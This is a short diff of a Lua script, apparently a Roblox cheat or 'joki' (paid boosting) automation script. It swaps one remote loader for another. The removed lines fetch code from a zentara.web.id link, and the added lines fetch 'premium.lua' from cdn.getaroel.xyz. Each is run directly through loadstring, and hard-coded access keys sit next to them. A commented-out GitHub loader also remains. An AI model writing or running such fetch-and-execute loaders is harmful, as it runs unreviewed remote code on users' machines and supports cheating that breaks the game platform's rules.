@@ -880,10 +880,8 @@ local function startJokiUang()
         getgenv().teleportTime        = "50.5"
         getgenv().recallJobTime       = "0.3"
         getgenv().optimizePerformance = true
- getgenv().ZentaraKey = "ZH_50025a2667616fa7b46271e1"
-local s for i=1,3 do local o,r=pcall(function()return game:HttpGet("https://www.zentara.web.id/l/6a63599126ffb4e56d289f34?t="..os.time())end)if o and type(r)=="string"and#r>0 and r:sub(1,1)~="<"then s=r break end if i<3 then(task and task.wait or wait)(1)end end assert(loadstring(s or error("Zentara Hub: Connection timed out after 3 retries.")))()
-
-        -- INI SCRIPT SATUNYA:
+ script_key="kxwOQhlKLYhvFmUnUhcFXoUnDyDDqVhe";
+loadstring(game:HttpGet("https://cdn.getaroel.xyz/s/premium.lua"))()
         --script_key="QcEodpdBkpQLVHmaaIRvduPLpewFdzTP";
         --loadstring(game:HttpGet("https://raw.githubusercontent.com/bimoraa/Euphoria/refs/heads/main/loader.luau"))()
     end)
